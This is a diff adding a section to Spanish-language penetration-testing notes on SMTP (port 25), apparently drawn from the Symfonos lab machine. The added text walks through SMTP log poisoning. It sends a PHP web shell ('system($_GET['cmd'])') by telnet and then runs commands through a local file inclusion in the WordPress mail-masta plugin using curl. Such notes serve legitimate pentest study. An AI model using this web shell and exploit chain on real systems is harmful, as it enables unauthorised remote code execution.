@@ -61,7 +61,33 @@ python2 45233.py <ip-address>
 ## 25 SMTP (Simple Mail Transfer Protocol).
 Protocolo de red de texto plano utilizado para enviar y recibir correos electrónicos lo que hace que las comunicaciones entre el cliente de correo y el servidor de correo puedan ser legibles para cualquier persona que interprete la comunicación. Para evitar esto se utilizan protocolos de cifrado como STARTTLS o DMARC.<br>
 Cuando un usuario envía un correo electrónico, su cliente de correo (ya sea Outlook o Gmail) utiliza SMTP para enviar el mensaje al servidor de correo destinatario.<br>
-SMTP solo se encarga de enviar correos electrónicos, no los almacena ni los muestra al usuario final, para esto se utilizan los protocolos POP3 y IMAP.
+SMTP solo se encarga de enviar correos electrónicos, no los almacena ni los muestra al usuario final, para esto se utilizan los protocolos POP3 y IMAP.<br>
+Puedes conectarte a la máquina usando telnet para enviar un correo electrónico a un usuario válido dentro del sistema el cual contenga código malicioso php y ver si se acontece un log poisoning y ejecutar comandos de forma remota "RCE" (Remote Code Execution), todo esto en caso de que no requiera de autenticación al momento de conectarse.
+```
+telnet <ip-address> 25
+```
+Una vez conectado, esta sería la estructura básica para enviar un correo por SMTP.
+```
+MAIL FROM: <username>	# MAIL FROM: es para específicar el remitente del correo.
+RCPT TO: <username>	# RCPT TO: es para indicar el resceptor del correo pero este tipo que ser un usuario válido dentro del sistema.
+DATA			# Poner DATA y luego dar enter para introducir el código.
+<?php system($_GET['cmd']); ?>	# Códido php para aplicar un RCE mediante el parametro cmd.
+.			# Al termino del correo se debe finalizar con un punto.
+
+QUIT			# Cortar la conexión.
+```
+Ya solo queda revisar los logs para veríficar que se haya guardado correctamente en la ruta /var/mail/<username>, mediante un LFI (Local File Inclution) o alguna otra vulnerabilidad encontrada (Log poisoning).<br>
+Este sería un ejemplo desde consola usando el comando curl para tramitar la petición.
+```
+curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=whoami"
+
+# helios es el nombre de usuario al cual se le envió en correo.
+# -s -> Indica que la petición se realizará en formato silencioso. 
+# -X -> Este parametro es para específicar el método por el cual se tramitará la petición que en este caso se usa el método GET.
+# &cmd=whoami -> Concatenación del parámetro cmd para inyectar el comando whoami y ver si se tiene ejecución remota de comandos "RCE".
+```
+Para hacer esto desde el sitio web solo basta con poner la url donde se acontece el LFI seguido del parámetro cmd para inyectar los comandos.<br>
+http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/<username>&cmd=whoami
 <br><br>
 ## 80 HTTP (Hypertext Transfer Protocol)
 Protocolo usado para montar sitios web.
